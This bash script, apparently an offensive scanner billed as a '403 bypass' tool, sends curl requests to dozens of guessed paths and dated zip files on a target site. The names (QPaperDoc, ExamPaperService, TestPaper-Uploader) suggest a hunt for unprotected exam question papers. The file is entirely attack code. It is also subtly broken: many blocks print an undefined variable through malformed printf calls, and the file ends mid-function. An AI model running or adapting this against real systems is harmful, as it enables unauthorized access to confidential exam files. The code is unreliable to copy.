#!/bin/bash
#color
red='\e[31m'
green='\e[32m'
blue='\e[34m'
cyan='\e[96m'
ltcyan='\e[96m'
yellow='\e[33m'
black='\e[38;5;016m'
bluebg='\e[48;5;038m'${black}
end='\e[0m'
termwidth="$(tput cols)"
function print(){
	status=$(echo ${code} | awk '{print $2}'|sed 's/,$//g')
	if [[ ${status} =~ 2.. ]];then
			printf "${green} ${code} ${end} 👌\n${payload}\n"
	elif [[ ${status} =~ 3.. ]]; then
			printf "${yellow} ${code} ${end}\n"
	elif [[ ${status} =~ 5.. ]]; then
			printf "${ltcyan} ${code} ${end}\n"
	else
			printf "${red} ${code} ${end}\n"
	fi
}
function banner(){
	echo "💀💀💀💀💀💀💀💀💀"
	echo -e "💀$green Have a beer🍺💀 $end"
}
function usage(){
        printf "Usage:\n"
        printf "\t403-bypass [URL]\n">&2
        printf '\n' >&2
        printf "\t-u, --url URL\t\t\ttarget DOMAIN.TLD/PATH\n">&2
		printf '\n' >&2
		printf "BYPASS MODEs\n">&2
		printf "\t--encode\t\t\tURL Encode Bypass\n">&2\
		printf '\n' >&2
		printf "ALL BYPASSES\n">&2
		printf "\t--exploit\t\t\tComplete Scan: 403/401 bypass modes \n">&2
		printf '\n' >&2
		printf "\t${green}GREEN${end}\t:\t${green}2xx Status Code${end}\n">&2
		printf "\t${yellow}YELLOW${end}\t:\t${yellow}3xx Status Code${end}\n">&2
		printf "\t${red}RED${end}\t:\t${red}4xx Status Code${end}\n">&2
		printf "\t${ltcyan}BLUE${end}\t:\t${ltcyan}5xx Status Code${end}\n">&2
}
function URL_Encode_Bypass(){
	echo -e ${blue}"----------------------"${end}
	echo -e ${cyan}"[+] URL Encode Bypass "${end}
	echo -e ${blue}"----------------------"${end}
	
	echo -n "Payload [QP02_12_2023%2008_53_31.zip ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}QP02_12_2023%2008_53_31.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}QP02_12_2023%%%%2008_53_31.zip' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
	print
  echo -n "Payload [QP02_12_2023%2008_53_32.zip ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}QP02_12_2023%2008_53_32.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}QP02_12_2023%%%%2008_53_32.zip' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
	print
  echo -n "Payload [QP02_12_2023%2008_53_33.zip ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}QP02_12_2023%2008_53_33.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}QP02_12_2023%%%%2008_53_33.zip' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
	print
 echo -n "Payload ["QPBulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManager_QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManager_QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Admin_QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Admin_QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMasterSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMasterSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SystemQPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SystemQPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Module-QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Module-QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Transfer_QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Transfer_QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessingQPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessingQPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManager_QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManager_QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing_ProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing_ProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem-DataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem-DataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBDataPortal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBDataPortal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPB-Panel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPB-Panel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploadUploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploadUploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader-Workflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader-Workflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_PManagement/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_PManagement/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk-DataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk-DataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin_DataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin_DataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader-Dashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader-Dashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessor-QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessor-QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile_Service/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile_Service/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPService_DataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPService_DataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud_System/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud_System/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Processing-QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Processing-QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModule_QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModule_QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Control_QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Control_QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper-FileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper-FileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaperService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaperService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow_Suite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow_Suite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringQPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringQPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystem_QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystem_QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBDataFileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBDataFileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAutoTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAutoTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Manager_QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Manager_QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingQPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingQPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataSync_QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataSync_QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDocSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDocSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaper-Uploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaper-Uploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl-Monitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl-Monitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Control_QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Control_QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Management-QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Management-QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P_DataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P_DataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessor_QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessor_QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploaderDataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploaderDataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessing-QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessing-QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper-Sync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper-Sync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload_AutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload_AutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloudBatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloudBatchProcessor/"" -H "User-Agent: Mozilla/5.0")
